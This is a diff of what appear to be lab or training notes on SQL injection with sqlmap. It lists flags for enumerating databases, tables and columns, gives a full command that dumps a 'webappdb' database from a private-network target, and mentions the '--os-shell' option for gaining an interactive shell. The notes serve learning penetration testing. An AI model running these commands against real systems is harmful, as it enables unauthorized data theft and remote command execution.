@@ -182,6 +182,9 @@ From here we can quickly enumerate the databses:
 `--dbs --dump` to output a list of databases, "dump" can be applied to multiple other queries
 `-D Foo --tables` output a list of tables from the "Foo" database
 `-D Foo -T bar --columns` output a list of columns from the "bar" table in "Foo" database
-
+For this particular exercise we need to output the entire "webappdb" database which we can do with the following command:
+`sqlmap -u http://192.168.157.10/debug.php?id=1 -p "id" -D webappdb --dump`
+![[Pasted image 20220620175613.png]]
 
 3.  Use sqlmap to obtain an interactive shell.
+This is achieved by passing the "os-shell" arguement.
